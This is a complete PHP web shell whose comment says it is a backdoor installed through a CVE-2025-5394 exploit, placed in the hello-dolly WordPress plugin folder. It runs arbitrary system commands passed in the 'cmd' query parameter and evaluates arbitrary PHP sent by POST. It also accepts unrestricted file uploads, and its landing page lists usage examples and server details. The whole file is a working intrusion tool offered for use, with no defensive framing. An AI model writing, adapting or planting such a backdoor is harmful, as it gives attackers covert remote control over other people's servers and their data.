<?php
/**
 * Backdoor shell for CVE-2025-5394 exploit
 * Access: /wp-content/plugins/hello-dolly/bk.php?cmd=COMMAND
 */

// Simple command execution backdoor
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
    exit;
}

// PHP code execution backdoor
if (isset($_POST['code'])) {
    eval($_POST['code']);
    exit;
}

// File upload backdoor
if (isset($_FILES['file'])) {
    $upload_dir = dirname(__FILE__);
    $target_file = $upload_dir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        echo "File uploaded: " . $target_file;
    } else {
        echo "Upload failed";
    }
    exit;
}

// Default: show info
echo "<h1>Backdoor Active</h1>";
echo "<p>Usage:</p>";
echo "<ul>";
echo "<li>Command execution: ?cmd=whoami</li>";
echo "<li>PHP code: POST code=phpinfo();</li>";
echo "<li>File upload: POST file=@/path/to/file</li>";
echo "</ul>";
echo "<p>Server Info:</p>";
echo "<pre>";
echo "PHP Version: " . phpversion() . "\n";
echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
echo "Document Root: " . $_SERVER['DOCUMENT_ROOT'] . "\n";
echo "Current Dir: " . __DIR__ . "\n";
echo "</pre>";

